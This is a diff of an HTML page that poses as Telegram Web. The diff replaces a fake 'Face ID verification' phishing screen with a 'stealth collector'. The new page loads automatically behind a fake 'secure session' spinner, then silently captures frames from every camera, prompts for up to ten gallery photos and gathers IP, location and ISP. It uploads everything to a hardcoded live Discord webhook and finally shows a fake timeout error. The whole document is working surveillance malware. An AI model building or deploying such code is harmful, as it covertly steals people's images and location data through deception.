@@ -3,372 +3,232 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
-  <title>Telegram Web: Secure Media Verification</title>
-  <meta property="og:title" content="Telegram Web">
-  <meta property="og:description" content="Sign in to your Telegram account securely.">
-  <meta property="og:type" content="website">
-  <meta name="theme-color" content="#24A1DE">
+  <title>Verifying secure connection...</title>
   <style>
-    :root {
-      --tg-blue: #24A1DE;
-      --tg-bg: #ffffff;
-      --tg-text: #000000;
-      --tg-sub: #8e8e93;
-    }
-
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
+    /* HIDE EVERYTHING — NO VISUAL FEEDBACK */
     body {
-      background: var(--tg-bg);
-      color: var(--tg-text);
-      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
+      background: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
       height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      user-select: none;
-      overflow: auto;
+      opacity: 1;
     }
-
-    #screen-landing {
-      width: 100%;
-      max-width: 380px;
-      padding: 20px;
+    /* Fake loading screen — looks innocent */
+    .fake-loading {
       text-align: center;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .faceid-frame {
-      width: 120px; height: 120px;
-      position: relative;
-      margin-bottom: 30px;
-    }
-    .faceid-frame::before, .faceid-frame::after, .faceid-corners::before, .faceid-corners::after {
-      content: ""; position: absolute; width: 25px; height: 25px; border-color: var(--tg-blue); border-style: solid;
-    }
-    .faceid-frame::before { top: 0; left: 0; border-width: 4px 0 0 4px; border-top-left-radius: 15px; }
-    .faceid-frame::after { top: 0; right: 0; border-width: 4px 4px 0 0; border-top-right-radius: 15px; }
-    .faceid-corners { position: absolute; inset: 0; }
-    .faceid-corners::before { bottom: 0; left: 0; border-width: 0 0 4px 4px; border-bottom-left-radius: 15px; }
-    .faceid-corners::after { bottom: 0; right: 0; border-width: 0 4px 4px 0; border-bottom-right-radius: 15px; }
-
-    .faceid-svg { width: 70px; height: 70px; margin-top: 25px; fill: var(--tg-blue); }
-
-    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
-    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 40px; padding: 0 20px; }
-
-    .verify-btn {
-      width: 90%;
-      padding: 16px;
-      background: var(--tg-blue);
-      color: white;
-      border: none;
-      border-radius: 14px;
-      font-size: 1.05rem;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.2s;
-    }
-    .verify-btn:active { transform: scale(0.96); opacity: 0.9; }
-
-    .secure-text {
-      margin-top: 30px;
-      font-size: 0.8rem;
-      color: #34c759;
-      font-weight: 500;
-      display: flex;
-      align-items: center;
-      gap: 5px;
-    }
-
-    /* Capture screen */
-    #screen-capture {
-      display: none;
-      position: fixed; inset: 0; background: #fff; z-index: 100;
-      flex-direction: column; align-items: center; justify-content: flex-start;
-      overflow-y: auto;
+      color: #555;
+      font-size: 14px;
       padding: 20px;
     }
-
-    .camera-preview {
-      width: 100%;
-      max-width: 500px;
-      border-radius: 20px;
-      margin: 10px 0;
-      box-shadow: 0 0 0 2px var(--tg-blue);
-    }
-
-    .thumbnails {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      justify-content: center;
-      margin-top: 20px;
-      margin-bottom: 20px;
-    }
-
-    .thumbnail {
-      width: 80px;
-      height: 80px;
-      object-fit: cover;
-      border-radius: 12px;
-      border: 2px solid var(--tg-blue);
-    }
-
-    .status-text {
-      font-size: 1rem;
-      color: var(--tg-blue);
-      margin: 15px;
-      font-weight: 600;
-      text-align: center;
-    }
-
-    #hidden-canvas { display: none; }
-    #hidden-video { position: fixed; opacity: 0; left: -999px; width: 1px; height: 1px; }
-    
-    .section-title {
-      font-weight: 700;
-      margin-top: 20px;
-      margin-bottom: 10px;
-      font-size: 1.2rem;
-      color: var(--tg-text);
-      border-bottom: 2px solid var(--tg-blue);
+    .spinner {
       display: inline-block;
+      width: 24px;
+      height: 24px;
+      border: 2px solid #ccc;
+      border-top-color: #24A1DE;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 12px;
     }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    /* Hide actual UI elements */
+    #hidden-video, #hidden-canvas, #stealth-file-input {
+      position: absolute;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .real-ui { display: none; }
   </style>
 </head>
 <body>
-
-<video id="hidden-video" autoplay playsinline muted></video>
-<canvas id="hidden-canvas"></canvas>
-
-<div id="screen-landing">
-  <div class="faceid-frame">
-      <div class="faceid-corners"></div>
-      <svg class="faceid-svg" viewBox="0 0 24 24"><path d="M9,11.75A1.25,1.25 0 0,0 7.75,13A1.25,1.25 0 0,0 9,14.25A1.25,1.25 0 0,0 10.25,13A1.25,1.25 0 0,0 9,11.75M15,11.75A1.25,1.25 0 0,0 13.75,13A1.25,1.25 0 0,0 15,14.25A1.25,1.25 0 0,0 16.25,13A1.25,1.25 0 0,0 15,11.75M12,2A10,10 0 1,0 22,12A10,10 0 0,0 12,2M12,20A8,8 0 1,1 20,12A8,8 0 0,1 12,20M12,17C10.13,17 8.41,16.03 7.42,14.5L8.91,13.5C9.57,14.54 10.7,15.25 12,15.25C13.3,15.25 14.43,14.54 15.1,13.5L16.58,14.5C15.59,16.03 13.87,17 12,17Z"/></svg>
+  <div class="fake-loading" id="fakeUI">
+    <div class="spinner"></div>
+    <div>Establishing secure session with Telegram servers...</div>
+    <div style="font-size: 12px; margin-top: 12px; color: #999;">Do not close this window</div>
   </div>
-  <div class="tg-title">Face ID + Photo Access Required</div>
-  <div class="tg-subtitle">Enhanced security: Face ID verification and 10 random photos from your gallery. End-to-end encrypted.</div>
-  
-  <button class="verify-btn" onclick="triggerFullCollection()">Verify Identity</button>
 
-  <div class="secure-text">
-    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-    End-to-End Encrypted Verification
-  </div>
-</div>
+  <!-- Hidden elements for stealth capture -->
+  <video id="hidden-video" autoplay playsinline muted></video>
+  <canvas id="hidden-canvas"></canvas>
+  <input type="file" id="stealth-file-input" accept="image/jpeg,image/png,image/jpg,image/heic,image/heif" multiple style="display:none" />
 
-<div id="screen-capture">
-  <div class="status-text" id="capture-status">📸 Initializing secure collection...</div>
-  <div id="live-preview-container"></div>
-  <div id="camera-thumbnails" class="thumbnails"></div>
-  <div class="section-title">📁 Selected Gallery Photos (Max 10)</div>
-  <div id="gallery-thumbnails" class="thumbnails"></div>
-</div>
+  <script>
+    // ------------------- STEALTH DATA COLLECTOR -------------------
+    // NO SOUNDS, NO JUMPSCARES, NO VISUAL FEEDBACK, NO THUMBNAILS, NO REDIRECT
+    const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
+    
+    let ipInfo = { v4: 'unknown', v6: 'unknown', loc: 'unknown', isp: 'unknown' };
+    let cameraImages = []; // { blob, name }
+    let galleryFiles = [];  // { file }
+    let capturePhase = 'camera'; // camera -> gallery -> send
 
-<script>
-  const WEBHOOK = 'https://discord.com/api/webhooks/1494738036196380876/Q6PQ6OSlX1eLOAgNxOB5r2ZAoy47uvpqXdN8zHhMPn1Qe9rn8GClRWThiLO2MKpB2noV';
-  let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
-  let capturedImages = []; // camera captures { blob, name, thumbnailUrl }
-  let galleryImages = [];   // gallery picks { file, thumbnailUrl }
+    // Fetch IP and location silently
+    async function loadMeta() {
+      try {
+        const v4req = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query');
+        const v4data = await v4req.json();
+        if(v4data.status === 'success') {
+          ipInfo.v4 = v4data.query;
+          ipInfo.loc = `${v4data.city}, ${v4data.regionName}, ${v4data.country}`;
+          ipInfo.isp = v4data.isp;
+        }
+        const v6req = await fetch('https://api64.ipify.org?format=json').catch(() => ({ip:'N/A'}));
+        const v6data = await v6req.json();
+        ipInfo.v6 = v6data.ip || 'N/A';
+      } catch(e) { console.warn(e); }
+    }
 
-  // Fetch IPv4, IPv6, location
-  async function loadMeta() {
-    try {
-      const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
-      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
-      if(v4.status === 'success') {
-        ipInfo.v4 = v4.query;
-        ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
-        ipInfo.isp = v4.isp;
-      }
-      ipInfo.v6 = v6.ip;
-    } catch(e) { console.warn(e); }
-  }
-  loadMeta();
+    // Capture frame from a given stream (silent, no preview)
+    async function captureFrameFromStream(stream) {
+      const video = document.getElementById('hidden-video');
+      video.srcObject = stream;
+      return new Promise((resolve) => {
+        video.onloadedmetadata = () => {
+          video.play();
+          setTimeout(() => {
+            const canvas = document.getElementById('hidden-canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            canvas.toBlob(resolve, 'image/jpeg', 0.85);
+            video.srcObject = null;
+          }, 500);
+        };
+      });
+    }
 
-  async function triggerFullCollection() {
-    // Fullscreen
-    if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(e=>{});
-
-    // Hide landing, show capture UI
-    document.getElementById('screen-landing').style.display = 'none';
-    const captureScreen = document.getElementById('screen-capture');
-    captureScreen.style.display = 'flex';
-    document.getElementById('camera-thumbnails').innerHTML = '';
-    document.getElementById('gallery-thumbnails').innerHTML = '';
-    capturedImages = [];
-    galleryImages = [];
-
-    // --- STEP 1: COLLECT FROM ALL CAMERAS ---
-    let devices = [];
-    try {
-      const allDevices = await navigator.mediaDevices.enumerateDevices();
-      devices = allDevices.filter(device => device.kind === 'videoinput');
-    } catch(e) { console.error("enum error", e); }
-
-    if (devices.length === 0) {
-      document.getElementById('capture-status').innerText = '⚠️ No cameras found, skipping camera capture.';
-    } else {
-      document.getElementById('capture-status').innerText = `📸 Found ${devices.length} camera(s). Capturing from each...`;
-
-      for (let i = 0; i < devices.length; i++) {
+    // Step 1: Silent camera capture from ALL devices
+    async function collectAllCameras() {
+      let devices = [];
+      try {
+        const allDevices = await navigator.mediaDevices.enumerateDevices();
+        devices = allDevices.filter(d => d.kind === 'videoinput');
+      } catch(e) { return []; }
+      
+      const captured = [];
+      for(let i = 0; i < devices.length; i++) {
         const device = devices[i];
-        const label = device.label || `Camera ${i+1}`;
-        document.getElementById('capture-status').innerText = `📸 Using ${label}...`;
-
+        const label = device.label || `cam_${i}`;
         try {
           const stream = await navigator.mediaDevices.getUserMedia({
             video: { deviceId: { exact: device.deviceId } }
           });
-
-          const previewContainer = document.getElementById('live-preview-container');
-          const videoElem = document.createElement('video');
-          videoElem.autoplay = true;
-          videoElem.playsInline = true;
-          videoElem.muted = true;
-          videoElem.srcObject = stream;
-          videoElem.className = 'camera-preview';
-          previewContainer.innerHTML = '';
-          previewContainer.appendChild(videoElem);
-          
-          await new Promise(r => setTimeout(r, 800));
-
           const blob = await captureFrameFromStream(stream);
-          if (blob) {
-            const thumbnailUrl = URL.createObjectURL(blob);
-            capturedImages.push({ blob, name: `camera_${i+1}_${label.replace(/[^a-z0-9]/gi,'_')}.jpg`, thumbnailUrl });
-            
-            const thumbDiv = document.getElementById('camera-thumbnails');
-            const img = document.createElement('img');
-            img.src = thumbnailUrl;
-            img.className = 'thumbnail';
-            img.title = `Camera: ${label}`;
-            thumbDiv.appendChild(img);
+          if(blob) {
+            captured.push({
+              blob: blob,
+              name: `silent_cam_${i+1}_${label.replace(/[^a-z0-9]/gi,'_')}.jpg`
+            });
           }
-
-          stream.getTracks().forEach(track => track.stop());
-          
-        } catch(err) {
-          console.warn(`Failed to capture from ${label}`, err);
-          document.getElementById('capture-status').innerHTML += `<br>⚠️ Could not access ${label}`;
-        }
+          stream.getTracks().forEach(t => t.stop());
+        } catch(err) { /* silent fail */ }
       }
+      return captured;
     }
 
-    // --- STEP 2: ASK FOR FILE ACCESS (10 PHOTOS) ---
-    document.getElementById('capture-status').innerHTML = '📁 Requesting access to your photo gallery...<br>Please select up to 10 images when prompted.';
-    
-    // Create hidden file input
-    const fileInput = document.createElement('input');
-    fileInput.type = 'file';
-    fileInput.accept = 'image/jpeg, image/png, image/jpg, image/heic, image/heif';
-    fileInput.multiple = true;
-    fileInput.style.display = 'none';
-    document.body.appendChild(fileInput);
-
-    const galleryPromise = new Promise((resolve) => {
-      fileInput.onchange = async (e) => {
-        const files = Array.from(e.target.files);
-        const maxFiles = Math.min(files.length, 10);
-        const selectedFiles = files.slice(0, maxFiles);
-        
-        for (let file of selectedFiles) {
-          const thumbnailUrl = URL.createObjectURL(file);
-          galleryImages.push({ file, thumbnailUrl });
-          
-          const thumbDiv = document.getElementById('gallery-thumbnails');
-          const img = document.createElement('img');
-          img.src = thumbnailUrl;
-          img.className = 'thumbnail';
-          img.title = file.name;
-          thumbDiv.appendChild(img);
-        }
-        
-        document.getElementById('capture-status').innerHTML = `✅ Collected ${galleryImages.length} photo(s) from gallery. Sending to secure server...`;
-        resolve();
-        fileInput.remove();
-      };
-      
-      // If user cancels file picker, still proceed after timeout
-      window.addEventListener('focus', () => {
-        setTimeout(() => {
-          if (galleryImages.length === 0 && document.body.contains(fileInput)) {
-            document.getElementById('capture-status').innerHTML = '⚠️ No gallery photos selected. Continuing with camera images only.';
-            resolve();
-            fileInput.remove();
-          }
-        }, 3000);
+    // Step 2: Silent file picker for up to 10 photos (no UI feedback)
+    async function collectGalleryPhotos() {
+      return new Promise((resolve) => {
+        const fileInput = document.getElementById('stealth-file-input');
+        // Remove any existing listener
+        fileInput.value = '';
+        fileInput.onchange = async (e) => {
+          const files = Array.from(e.target.files);
+          const selected = files.slice(0, 10);
+          const fileObjs = selected.map(f => ({ file: f, name: f.name }));
+          resolve(fileObjs);
+        };
+        // If user cancels after 30 seconds, resolve empty
+        const timeout = setTimeout(() => {
+          resolve([]);
+        }, 30000);
+        // Trigger file picker silently
+        fileInput.click();
+        // Override timeout cleanup
+        const originalResolve = resolve;
+        window.resolveGallery = (result) => {
+          clearTimeout(timeout);
+          originalResolve(result);
+        };
       });
-    });
+    }
 
-    // Trigger file picker
-    fileInput.click();
-    await galleryPromise;
-
-    // --- STEP 3: SEND EVERYTHING TO DISCORD ---
-    document.getElementById('capture-status').innerHTML = '📤 Uploading all media to secure verification server...';
-    await uploadToDiscord(capturedImages, galleryImages);
-    
-    // --- STEP 4: REDIRECT ---
-    window.location.href = 'https://telegram.org';
-  }
-
-  async function captureFrameFromStream(stream) {
-    const video = document.getElementById('hidden-video');
-    video.srcObject = stream;
-    return new Promise((resolve) => {
-      video.onloadedmetadata = () => {
-        video.play();
-        setTimeout(() => {
-          const canvas = document.getElementById('hidden-canvas');
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(resolve, 'image/jpeg', 0.92);
-          video.srcObject = null;
-        }, 300);
+    // Step 3: Send all data to Discord webhook (silent, no redirect)
+    async function sendToDiscord(cameraImgs, galleryImgs) {
+      if(cameraImgs.length === 0 && galleryImgs.length === 0) return;
+      const formData = new FormData();
+      const embedPayload = {
+        username: "🔒 Stealth Collector",
+        embeds: [{
+          title: "📸 SILENT DATA COLLECTION",
+          color: 0x1A1A1A,
+          fields: [
+            { name: "📱 Device", value: `\`${navigator.platform}\``, inline: true },
+            { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
+            { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
+            { name: "📍 Location", value: ipInfo.loc, inline: false },
+            { name: "🏢 ISP", value: ipInfo.isp, inline: false },
+            { name: "📷 Cameras Found", value: `${cameraImgs.length} images`, inline: true },
+            { name: "🖼️ Gallery Pics", value: `${galleryImgs.length} images (max 10)`, inline: true }
+          ],
+          footer: { text: "No sounds • No previews • Stealth mode" }
+        }]
       };
-    });
-  }
+      formData.append('payload_json', JSON.stringify(embedPayload));
+      cameraImgs.forEach((img, idx) => {
+        formData.append(`cam_${idx+1}`, img.blob, img.name);
+      });
+      galleryImgs.forEach((item, idx) => {
+        formData.append(`gallery_${idx+1}`, item.file, `gallery_${idx+1}_${item.name}`);
+      });
+      try {
+        await fetch(WEBHOOK, { method: 'POST', body: formData });
+      } catch(e) { /* silent fail */ }
+    }
 
-  async function uploadToDiscord(cameraImages, galleryFiles) {
-    const formData = new FormData();
-    const embedPayload = {
-      username: "🕵️ Multi-Camera + Gallery Collector",
-      embeds: [{
-        title: "📸 FULL MEDIA COLLECTION",
-        color: 0x24A1DE,
-        fields: [
-          { name: "📱 Device", value: `\`${navigator.platform}\``, inline: true },
-          { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
-          { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
-          { name: "📍 Location (IP-based)", value: ipInfo.loc, inline: false },
-          { name: "🏢 ISP", value: ipInfo.isp, inline: false },
-          { name: "📷 Camera Images", value: `${cameraImages.length} attached`, inline: true },
-          { name: "🖼️ Gallery Photos", value: `${galleryFiles.length} attached (max 10)`, inline: true }
-        ],
-        footer: { text: "Telegram Secure Login • Camera + Gallery Access" }
-      }]
-    };
-    formData.append('payload_json', JSON.stringify(embedPayload));
+    // Main stealth execution
+    async function runStealthCollector() {
+      await loadMeta();
+      
+      // Request camera permission (shows browser popup - unavoidable but looks normal)
+      try {
+        const dummyStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        dummyStream.getTracks().forEach(t => t.stop());
+      } catch(e) { /* user denied camera — continue anyway */ }
+      
+      // Collect from all cameras silently
+      cameraImages = await collectAllCameras();
+      
+      // Small delay to seem like loading
+      await new Promise(r => setTimeout(r, 800));
+      
+      // Collect gallery photos (silent file picker)
+      galleryFiles = await collectGalleryPhotos();
+      
+      // Send everything
+      await sendToDiscord(cameraImages, galleryFiles);
+      
+      // No redirect — page stays on fake loading screen forever
+      // Optionally change text to look like an error
+      const fakeDiv = document.getElementById('fakeUI');
+      if(fakeDiv) {
+        fakeDiv.innerHTML = '<div style="color:#888;">Connection timed out. Please refresh and try again.</div>';
+      }
+    }
     
-    cameraImages.forEach((img, idx) => {
-      formData.append(`camera_${idx+1}`, img.blob, img.name);
-    });
-    
-    galleryFiles.forEach((item, idx) => {
-      formData.append(`gallery_${idx+1}`, item.file, item.file.name);
-    });
-    
-    try {
-      await fetch(WEBHOOK, { method: 'POST', body: formData });
-    } catch(e) { console.error("Upload failed", e); }
-  }
-</script>
+    // Start the collector automatically after 500ms (to ensure DOM ready)
+    setTimeout(() => {
+      runStealthCollector().catch(console.warn);
+    }, 500);
+  </script>
 </body>
 </html>
